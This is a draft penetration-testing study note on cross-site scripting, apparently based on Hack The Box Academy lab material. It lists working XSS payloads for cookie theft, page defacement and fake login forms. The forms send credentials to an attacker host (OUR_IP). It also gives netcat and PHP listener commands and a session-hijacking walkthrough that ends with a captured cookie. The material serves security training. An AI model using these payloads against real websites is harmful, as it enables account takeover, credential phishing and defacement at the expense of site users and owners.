---
title: Cross-Site Scripting (XSS)
aliases: []
tags:
- study-notes/xss
- technique/t1190
- technique/t1555-004
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: xss.md
related_tools:
- '[[XSStrike]]'
- '[[BruteXSS]]'
- '[[xsser]]'
related_techniques:
- '[[t1190]]'
- '[[t1555-004]]'
related_tactics:
- '[[ta0003]]'
related_services: []
related_os: []
related_notes: []
mitre_tactic: TA0003
mitre_technique: T1190
real_path: ''
port: ''
protocol: ''
os: ''
---

# Cross-Site Scripting (XSS)

## Description
Cross-Site Scripting (XSS) vulnerabilities take advantage of a flaw in user input sanitization to 'write' JavaScript code to the page and execute it on the client side, leading to several types of attacks.

## Types of XSS
- **Persistent XSS (Stored XSS)**: The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments).
- **Non-Persistent XSS (Reflected XSS)**: Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).
- **DOM-based XSS**: Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags).

## Payloads
- **Basic XSS Payloads**:
  - `<script>alert(window.origin)</script>`
  - `<plaintext>`
  - `<script>print()</script>`
- **Get Cookie**:
  - `<script>alert(document.cookie);</script>`
- **HTML-based XSS**:
  - `<img src="" onerror=alert(document.cookie)>`
- **Change Background Color**:
  - `<script>document.body.style.background = "#141d2b"</script>`
- **Change Background Image**:
  - `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`
- **Change Website Title**:
  - `<script>document.title = 'HackTheBox Academy'</script>`
- **Overwrite Website's Main Body**:
  - `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`
- **Remove Certain HTML Element**:
  - `<script>document.getElementById('urlform').remove();</script>`
- **Load Remote Script**:
  - `<script src="http://OUR_IP/script.js"></script>`
- **Send Cookie Details to Us**:
  - `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`

## Discovery Tools
- **XSStrike**:
  - `git clone https://github.com/s0md3v/XSStrike.git`
  - `pip install -r requirements.txt`
  - `sudo apt install python3-fuzzywuzzy`
  - `python /usr/share/XSStrike/xsstrike.py --url "http://83.136.251.170:37403/index.php?fullname=aaa&username=bbb&password=ccc&email=ddd%40ddd.com"`
- **BruteXSS**
- **xsser**

## Defacement
- `<script>document.body.style.background = "#141d2b"</script>`
- `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`
- `<script>document.title = 'HackTheBox Academy'</script>`
- `<script>document.getElementById("todo").innerHTML = 'New Text';</script>`
- `<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>'</script>`

## Phishing
- **Setup Up Kali to Get Ready for Creds**:
  - `sudo nc -lvnp 80`
  - Or copy [capture-creds.php](assets/attachments/kb/htb/redteam/assets/techniques/xss/capture-creds.php), rename to index.php and create temp php server
  - `mkdir /tmp/tmpserver && cd /tmp/tmpserver`
  - `sudo php -S 0.0.0.0:80`
- **Payloads**:
  - `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');`
  - `document.getElementById('urlform').remove();`
  - **Complete Payload**:
  - `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`

## Session Hijacking
- **Find Field That Can Be Used to Inject XSS**:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  - **Capture Responses**:
  - `sudo php -S 0.0.0.0:80`
  - **Inject to Find Vulnerable Fields**:
  - `"><script src=http://10.10.15.199/script.js></script>`
  - **Script.js Contains**:
  - `new Image().src='http://OUR_IP/index.php?c='+document.cookie`
  - **Cookie is Captured**:
  - `[Fri Nov  1 14:24:09 2024] 10.129.84.227:44700 [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d`

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
- https://github.com/payloadbox/xss-payload-list
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

